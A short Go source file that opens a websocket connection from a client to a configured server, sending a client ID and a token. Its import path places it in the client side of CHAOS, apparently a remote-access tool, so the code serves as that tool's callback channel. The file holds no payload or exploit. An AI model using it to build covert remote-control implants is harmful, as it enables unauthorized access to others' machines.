package websocket

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"net/http"
	"net/url"
	"strings"
)

func NewConnection(configuration *environment.Configuration, clientID string) (*websocket.Conn, error) {
	host := configuration.Server.Address
	host = strings.TrimPrefix(host, "http://")
	host = strings.TrimPrefix(host, "https://")
	host = strings.TrimSuffix(host, "/")

	if configuration.Server.HttpPort != "" {
		host = fmt.Sprint(host, ":", configuration.Server.HttpPort)
	}

	scheme := "ws"
	if strings.Contains(configuration.Server.Address, "https") {
		scheme = "wss"
	}

	u := url.URL{Scheme: scheme, Host: host, Path: "/client"}

	header := http.Header{}
	header.Set("x-client", clientID)
	header.Set("Cookie", configuration.Connection.Token)

	conn, _, err := websocket.DefaultDialer.Dial(u.String(), header)
	return conn, err
}
